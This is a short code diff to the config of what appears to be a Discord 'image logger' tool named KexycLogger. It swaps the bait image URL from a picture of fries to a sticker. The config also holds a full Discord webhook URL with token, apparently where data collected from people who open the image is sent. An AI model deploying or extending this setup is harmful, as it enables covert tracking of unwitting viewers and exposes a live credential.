@@ -11,7 +11,7 @@ __author__ = "@kexyc"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1502035551753343168/40OzcbXsPy3Blx5T4tTi7H_BbCJ5lwHbGXkcTzOyoNdjQNY-R82GQKbHoH-ftWx8t55T",
-    "image": "https://cdn.britannica.com/34/206334-050-7637EB66/French-fries.jpg", 
+    "image": "https://stickerly.pstatic.net/sticker_pack/eNrxqOuc388RTr1MVqOg/BKPGHG/16/61453289.png", 
     "imageArgument": True,
 
     "username": "KexycLogger", 
